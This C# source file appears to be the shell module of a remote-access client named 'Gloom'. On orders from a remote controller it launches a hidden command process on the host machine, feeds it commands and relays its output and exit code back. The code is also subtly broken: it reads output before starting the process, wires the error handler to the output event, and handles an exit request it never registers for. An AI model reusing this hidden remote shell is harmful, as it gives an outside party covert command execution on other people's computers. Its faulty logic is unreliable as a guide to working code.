using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Gloom.Client.Features
{
	public class Shell : FeatureBase
	{
		public override Guid[] AcceptedOps => new Guid[] { OpCodes.ShellOpenRequest, OpCodes.ShellInRequest };
		private Guid? sid;
		private Process? shell;

		public Shell(IMessageSender sender) : base(sender)
		{
		}

		public override async Task HandleAsync(Guid op, byte[] data)
		{
			if (op == OpCodes.ShellOpenRequest)
			{
				var req = data.Deserialize<OpStructs.ShellOpenRequest>();
				try
				{
					sid = req.Sid;
					shell = new Process();
					shell.StartInfo.FileName = req.ShellFileName;
					shell.StartInfo.Arguments = req.ShellArguments;
					shell.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
					shell.StartInfo.CreateNoWindow = true;
					shell.StartInfo.RedirectStandardInput = true;
					shell.StartInfo.RedirectStandardOutput = true;
					shell.StartInfo.RedirectStandardError = true;
					shell.BeginOutputReadLine();
					shell.BeginErrorReadLine();
					shell.Start();
					shell.OutputDataReceived += OutReceived;
					shell.OutputDataReceived += ErrReceived;
					shell.Exited += Exited;
				}
				catch (Exception ex)
				{
#if DEBUG
					Console.WriteLine(ex.ToString());
#endif
					await SendAsync(OpCodes.ShellErrResponse, new OpStructs.ShellErrResponse { Sid = sid ?? Guid.Empty, Message = "Shell open failed. Error: " + ex });
				}
			}
			else if (op == OpCodes.ShellInRequest && shell != null)
			{
				var req = data.Deserialize<OpStructs.ShellInRequest>();
				await shell.StandardInput.WriteLineAsync(req.Message);
			}
			else if (op == OpCodes.ShellExitRequest && shell != null)
			{
				shell.Kill();
			}
		}

		public async void OutReceived(object sender, DataReceivedEventArgs args)
		{
			var message = args.Data;
			if (string.IsNullOrWhiteSpace(message))
				return;
			await SendAsync(OpCodes.ShellOutResponse, new OpStructs.ShellOutResponse { Sid = (Guid)sid!, Message = message });
		}

		public async void ErrReceived(object sender, DataReceivedEventArgs args)
		{
			var message = args.Data;
			if (string.IsNullOrWhiteSpace(message))
				return;
			await SendAsync(OpCodes.ShellErrResponse, new OpStructs.ShellErrResponse { Sid = (Guid)sid!, Message = message });
		}

		public async void Exited(object sender, EventArgs args)
		{
			int errCode = shell?.ExitCode ?? -1;
			await SendAsync(OpCodes.ShellExitResponse, new OpStructs.ShellExitResponse { Sid = (Guid)sid!, ExitCode = errCode });
			shell = null;
		}
	}
}
